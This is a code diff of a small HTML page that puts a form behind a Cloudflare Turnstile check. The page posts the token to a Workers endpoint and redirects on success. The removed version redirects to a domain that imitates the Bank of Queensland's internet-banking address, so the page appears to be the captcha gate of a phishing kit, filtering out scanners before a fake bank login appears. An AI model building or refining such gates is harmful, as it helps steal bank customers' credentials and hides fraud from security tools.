@@ -1,38 +1,106 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Turnstile Demo</title>
+
+    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
+
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: #f4f4f4;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        form {
+            background: white;
+            padding: 25px;
+            border-radius: 10px;
+            box-shadow: 0 5px 20px rgba(0,0,0,.1);
+            width: 320px;
+        }
+
+        button {
+            width: 100%;
+            margin-top: 15px;
+            padding: 12px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+
+<form id="myForm">
+
+    <h2>Verify</h2>
+
+    <div
+        class="cf-turnstile"
+        data-sitekey="0x4AAAAAADviox3Tz8fVZXRI">
+    </div>
+
+    <button type="submit">Continue</button>
+
+</form>
+
 <script>
 document.getElementById("myForm").addEventListener("submit", async (e) => {
-  e.preventDefault();
+    e.preventDefault();
 
-  console.log("Button clicked");
-
-  const token = turnstile.getResponse();
-  console.log("Token:", token);
-
-  if (!token) {
-    alert("NO TOKEN — Turnstile not completed");
-    return;
-  }
-
-  try {
-    const res = await fetch("https://hcaptcha-verify.kamitassin.workers.dev", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ token })
-    });
-
-    const data = await res.json(); // ✅ FIXED
-
-    console.log("Response:", data);
-
-    if (data.success === true) {
-      alert("SUCCESS — redirecting");
-      window.location.href = "ib.boq.com.au.autocheck.click/mybq/index.html";
-    } else {
-      alert("Worker returned FAIL");
+    if (typeof turnstile === "undefined") {
+        alert("Turnstile failed to load.");
+        return;
     }
 
-  } catch (err) {
-    console.error(err);
-    alert("FETCH FAILED (Worker issue)");
-  }
+    const token = turnstile.getResponse();
+
+    console.log("Token:", token);
+
+    if (!token) {
+        alert("Please complete the Turnstile verification.");
+        return;
+    }
+
+    try {
+        const response = await fetch(
+            "https://hcaptcha-verify.kamitassin.workers.dev",
+            {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                    token: token
+                })
+            }
+        );
+
+        const data = await response.json();
+
+        console.log(data);
+
+        if (data.success) {
+            alert("Verification successful!");
+            window.location.href = "index.html";
+        } else {
+            alert("Verification failed.");
+
+            turnstile.reset();
+        }
+
+    } catch (err) {
+        console.error(err);
+        alert("Server error.");
+
+        turnstile.reset();
+    }
 });
 </script>
+
+</body>
+</html>
